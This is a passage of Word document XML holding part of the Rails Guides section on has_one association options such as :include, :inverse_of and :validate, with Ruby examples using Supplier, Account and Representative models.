      </w:r>
    </w:p>
    <w:p w14:paraId="5AEFE988" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DEDED2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to specify second-order associations that should be eager-loaded when this association is used. For example, consider these models:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5064"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="043B16F4" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41170504" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B28456B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42FBE0FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53F2BF1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="229ADC1C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29FADB77" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17C22E0A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :representative</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F6CE5E4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FBC0E67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C81768F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Representative &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DAE306E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :accounts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E84B5B1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69EC4556" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you frequently retrieve representatives directly from suppliers (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@supplier.account.representative</w:t>
      </w:r>
      <w:r>
        <w:t>), then you can make your code somewhat more efficient by including representatives in the association from suppliers to accounts:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6024"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="75B322BC" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="282CE503" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D5A65BA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :include</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :representative</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FFD6EE7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6894880E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25346FE8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67B5E38E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47E7BB57" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :representative</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="200AE302" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CB37481" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B895C37" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Representative &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FA3A4A4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :accounts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13EFE865" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74488167" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C99370B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the name of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that is the inverse of this association. Does not work in combination with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6024"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0BA8EFA8" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CE166C1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E2FD813" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C812232" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0109DB71" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72343A84" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58B5CA32" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :supplier, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="511AC94A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6AFEB65A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A68EFC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option dictates the order in which associated objects will be received (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ORDER BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause). Because a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association will only retrieve a single associated object, this option should not be needed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C82FCA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DE34D7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column used to hold the primary key of this model is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can override this and explicitly specify the primary key with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519E21DA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A858AE0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, then the associated object will be read-only when retrieved via the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D95AF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD41A09" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you override the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause that is used to retrieve data about the associated object. By default, Rails retrieves all columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F7C5B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A685C96" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the source association name for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B4CA4D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C19D59" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the source association type for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that proceeds through a polymorphic association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BE5411" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AC103A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies a join model through which to perform the query. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations were discussed in detail </w:t>
      </w:r>
      <w:hyperlink r:id="rId215" w:anchor="the-has_one-through-association" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>earlier in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF76B2C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.16 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD73241" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then associated objects will be validated whenever you save this object. By default, this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>: associated objects will not be validated when this object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AFB517" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.3 Do Any Associated Objects Exist?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C30627" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can see if any associated objects exist by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.nil?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="30121DD5" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52CFD4FE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@supplier.account.nil?</w:t>
